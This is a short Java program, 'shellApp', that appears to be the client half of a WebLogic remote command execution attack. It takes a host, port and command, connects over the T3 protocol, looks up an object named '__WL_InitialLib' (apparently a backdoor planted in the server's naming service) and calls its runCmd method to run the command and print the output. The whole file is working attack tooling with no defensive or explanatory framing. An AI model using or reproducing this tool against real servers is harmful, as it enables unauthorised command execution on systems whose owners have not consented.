import javax.naming.InitialContext;
import Utils.RyClient;
import weblogic.jndi.internal.InitApp;

public class shellApp {
	private static InitialContext Ic;
	private static InitApp App;
	/**
	 * @param args
	 */
	public static void main(String[] args) {
		// TODO Auto-generated method stub
		if(args.length!=3){
			printUsage();
			return;
		}	
		String host=args[0];
		String port=args[1];
		String cmd=args[2];
		String result = null;
		if(getApp(host,port)){
			result=execute(cmd);
		}
		System.out.println(result);
	}
	private static void printUsage(){
		System.out.println("Usage:java shellApp [HOST] [PORT] [CMD]");
	}
	private static boolean getApp(String host,String port){
		try
        {
			Ic = RyClient.getInitialContext("t3://" + host + ":" + port);
			App = ((InitApp)Ic.lookup("__WL_InitialLib"));
			return true;
        }
        catch (Exception ex)
        {
          System.err.println("An exception occurred: " + ex.getMessage());
          return false;
        }
	}
	private static String execute(String cmd){
		return App.runCmd(cmd);
	}

}
